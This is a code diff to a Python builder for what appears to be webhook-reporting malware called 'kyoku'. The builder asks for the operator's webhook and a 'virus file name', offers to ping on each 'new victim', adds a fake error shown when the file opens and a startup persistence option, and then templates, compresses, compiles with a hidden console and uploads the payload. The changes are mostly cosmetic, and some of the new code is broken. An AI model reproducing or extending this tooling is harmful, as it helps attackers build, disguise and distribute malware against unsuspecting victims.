@@ -18,75 +18,61 @@ class Builder:
         if not self.check():
             exit()
 
-        self.webhook = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET}Enter Your Webhook; ')
+        self.webhook = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Enter Your Webhook; ')
         if not self.check_webhook(self.webhook):
-            print(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {Fore.RED}Invalid Webhook.{Fore.RESET}")
-            str(input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET}Press Anything For Exit."))
+            print(f"{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} {Fore.RED}Invalid Webhook.{Fore.RESET}")
+            str(input(f"{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Press Anything For Exit."))
             sys.exit()
 
-        self.filename = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET}Enter Your Virus File Name: ')
+        self.filename = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Enter Your Virus File Name: ')
 
-        self.ping = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET}Ping On New Victim? (y/n): ')
+        self.ping = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Ping On New Victim? (y/n): ')
+
         if self.ping.lower() == 'y':
             self.ping = True
-            self.pingtype = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping Type (Here/Everyone) (Default Options Is Here.) ').lower()
+            self.pingtype = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Ping Type (Here/Everyone) (Default Options Is Here.) ').lower()
+
             if self.pingtype not in ["here", "everyone"]:
-                # default to @here if invalid ping type.
                 self.pingtype == "here"
         else:
             self.ping = False
             self.pingtype = "none"
 
-        self.error = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do You Want Fake Error With Your Virus Is Opening? (y/n): ')
+        self.error = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Do You Want Fake Error With Your Virus Is Opening? (y/n): ')
+
         if self.error.lower() == 'y':
             self.error = True
         else:
             self.error = False
+        self.startup = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Do You Want Startup? (y/n): ')
 
-        self.startup = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do You Want Startup? (y/n): ')
         if self.startup.lower() == 'y':
             self.startup = True
         else:
             self.startup = False
-
-
         self.defender = False
 
-        
-
-        self.compy = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} compile exe???')
-
-        if self.compy == 'y':
-            self.icon = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} do you want icon? if you want pls enter your icos file way')
-            if self.icon == 'y':
-                self.icon_exe()
-            else:
-                pass
-        else:
-            pass
+        # self.compy = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Compile exe? (y/n): ')
 
         self.mk_file(self.filename, self.webhook)
 
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} yeeee you virus is prepared{Fore.RESET}')
-
-        self.cleanup(self.filename)
-        self.renamefile(self.filename)
+        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Virus Prepared.{Fore.RESET}')
 
         try:
             self.gofile_upload(self.filename)
         except:
             pass
 
-        run = input(
-            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to test the file? : ')
-        if run.lower() == 'y':
-            self.run(self.filename)
+        # run = input(
+        #     f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Do you want to test the file? : ')
+        # if run.lower() == 'y':
+        #     self.run(self.filename)
 
-        input(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}')
+        input(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}')
         sys.exit()
 
     def loading(self):
-        p = Fore.MAGENTA + Style.DIM
+        p = Fore.WHITE + Style.DIM
         r = Fore.RED + Style.BRIGHT
 
         img = fr"""{p}
@@ -192,24 +178,24 @@ class Builder:
         return True
 
     def icon_exe(self):
-        self.icon_name = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter the name of the icon: ')
+        self.icon_name = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Enter the name of the icon: ')
 
         if os.path.isfile(f"./{self.icon_name}"):
             pass
         else:
             print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon not found! Please check the name and make sure it\'s in the current directory.')
-            input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit...")
+            input(f"{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Press anything to exit...")
 
         if self.icon_name.endswith('.ico'):
             pass
         else:
             print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon must have .ico extension! Please convert it and try again.')
-            input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit...")
+            input(f"{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Press anything to exit...")
 
 
 
     def mk_file(self, filename, webhook):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')
+        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')
 
         with open('./kyoku-main.py', 'r', encoding="utf-8") as f:
             code = f.read()
@@ -223,22 +209,16 @@ class Builder:
                     .replace("\"%_defender_enabled%\"", str(self.defender)))
 
         time.sleep(2)
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')
+        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')
 
         with open(f"{filename}.py", mode='rb') as f:
             content = f.read()
 
-        print(f"{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Compressing Code...{Fore.RESET}")
+        print(f"{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Compressing Code...{Fore.RESET}")
 
         original_size = len(content)
         content = self.compress(content)
         new_size = len(content)
-
-    
-           
-
-
-
 
     def compress(self, content):
         compressed_code = compress(content)
@@ -247,16 +227,16 @@ class Builder:
     
 
     def compile(self, filename):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
-        if self.icon == 'y':
-            icon = "./" + self.icon_name
-        else:
+        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
+        if self.compy == 'y':
             icon = "NONE"
-        os.system(f'python -m PyInstaller --hidden-import wmi --hidden-import pycryptodome --onefile --noconsole --upx-dir=./tools -i {icon} --distpath ./ .\\{filename}.py')
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
+            os.system('python -m PyInstaller --onefile --noconsole'+filename+'.py')
+            # os.system(f'python -m PyInstaller --hidden-import wmi --hidden-import pycryptodome --onefile --noconsole --upx-dir=./tools --distpath ./ .\\{filename}.py')
+        
+        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
 
     def run(self, filename):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Attempting to execute file...')
+        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Attempting to execute file...')
 
         if os.path.isfile(f'./{filename}.exe'):
             os.system(f'start ./{filename}.exe')
